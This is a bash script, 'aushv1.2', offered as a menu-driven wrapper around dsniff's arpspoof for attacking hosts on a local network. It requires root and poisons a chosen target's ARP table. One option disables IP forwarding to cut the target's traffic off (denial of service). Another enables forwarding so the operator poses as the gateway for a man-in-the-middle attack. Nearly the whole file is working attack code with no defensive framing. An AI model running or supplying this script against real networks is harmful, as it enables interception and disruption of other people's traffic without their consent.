#!/bin/bash

###########################################################"
#  aushv1.2 - dsniff arpspoof Utilitary                   #"
#                                                         #"
#  Created by Lucas Andrade <slucasandrade@protonmail.ch> #"
###########################################################"

export RED='\033[1;91m'
export ORIGIN='\033[1;00m'
export BLUE='\033[1;94m'

justSpoofing() {
		sleep 1
		echo " "

		echo "Assigning 1 to port forward value to pass yourself off as gateway...";sleep 1
		sysctl -w net.ipv4.ip_forward=1;sleep 2;echo " "

		echo "Poisoning the ARP table with ARP replies...";sleep 2;echo " "
		echo "Type 'Ctrl + C' to stop the replies and exit...";sleep 2;echo " "

		echo "### After exiting, the rest of the logs may appear on the screen, be patient and press enter :) ###"
		echo " ";sleep 2

		#arpspoofing with dsniff
		arpspoof -i $mod -t $target -r $gw &
		sleep 9999999
}

spoofingAndDenying() {		
		sleep 1
		echo " "

		echo "Assigning 0 to port forward value to deny requisition responses...";sleep 1
		sysctl -w net.ipv4.ip_forward=0;sleep 2;echo " "

		echo "Poisoning the ARP table with ARP replies...";sleep 2;echo " "
		echo "Type 'Ctrl + C' to stop the replies and exit...";sleep 2;echo " "

		echo "### After exiting, the rest of the logs may appear on the screen, be patient and press enter :) ###"
		echo " ";sleep 2

		#arpspoofing with dsniff
		arpspoof -i $mod -t $target -r $gw &
		sleep 9999999
}

echo " "
echo -e "$BLUE #> This simple script was made to be used as an utilitary to deny traffic or MITM it in your LAN using dsniff arpspoof," >&2
echo -e " #> see https://www.mankier.com/8/arpspoof to more details." >&2
echo -e " #> Improve code! Got in https://github.com/nstepsforward/aush" >&2
echo -e " #> Created by Lucas Andrade :) $ORIGIN" >&2
echo " "

if [ $(id -u) -ne 0 ]; then
 	echo " "
	echo -e "$RED This script has to be runned with root permissions! $ORIGIN" >&2
	echo " "
	exit 1;

else

	while :
	do
  	echo -e "$BLUE Choose an option:" >&2;echo " "
  	echo -e "1) Deny traffic in a single target" >&2
  	echo -e "2) Deny traffic in all hosts" >&2
  	echo -e "3) MITM in a single target" >&2;
  	echo -e "4) MITM in all hosts" >&2;
  	echo -e "5) Exit";echo " "
  	
  	echo -n "> ";read option
  	case $option in
		1)
            		#Getting variables
			echo "Enter the interface module to be used:";read mod;echo " "
			echo "Enter the network gateway:";read gw;echo " "
    			echo "Enter the target IP:";read target;echo " "

			# Make sure variables are OK

			if [[ $gw =~ ^192.168\.[0-9]{1,3}\.[0-9]{1,3}$ || $gw =~ 10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ || $gw =~ 172.16\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
                if [[ $target =~ ^192.168\.[0-9]{1,3}\.[0-9]{1,3}$ || $target =~ 10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ || $target =~ 172.16\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
				
					spoofingAndDenying
				fi

			else

				echo "Probably the gateway or target is wrong, check them and execute it again!";
				exit 1;
			fi
			;;
		2)
            echo " "
			echo "Under development, keep your eyes on https://github.com/nstepsforward/aush";echo " "
			sleep 2
			break
			;;
		3)
			#Getting variables
			echo "Enter the interface module to be used:";read mod;echo " "
			echo "Enter the network gateway:";read gw;echo " "
    			echo "Enter the target IP:";read target;echo " "

			# Make sure variables are OK

			if [[ $gw =~ ^192.168\.[0-9]{1,3}\.[0-9]{1,3}$ || $gw =~ 10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ || $gw =~ 172.16\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
                if [[ $target =~ ^192.168\.[0-9]{1,3}\.[0-9]{1,3}$ || $target =~ 10\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ || $target =~ 172.16\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
				
					justSpoofing
				fi

			else

				echo "Probably the gateway or target is wrong, check them and execute it again!";
				exit 1;
			fi
			;;
		4)
            		echo " "
			echo "Under development, keep your eyes on https://github.com/nstepsforward/aush";echo " "
			sleep 2
			break
			;;
		5)
			echo " ";echo "Laterz";echo " ";sleep 1;exit 0
			;;
		*)
			echo "$RED That's not an option :/ $ORIGIN"
			echo " $ORIGIN"
			;;
  	esac
done

fi

exit 0
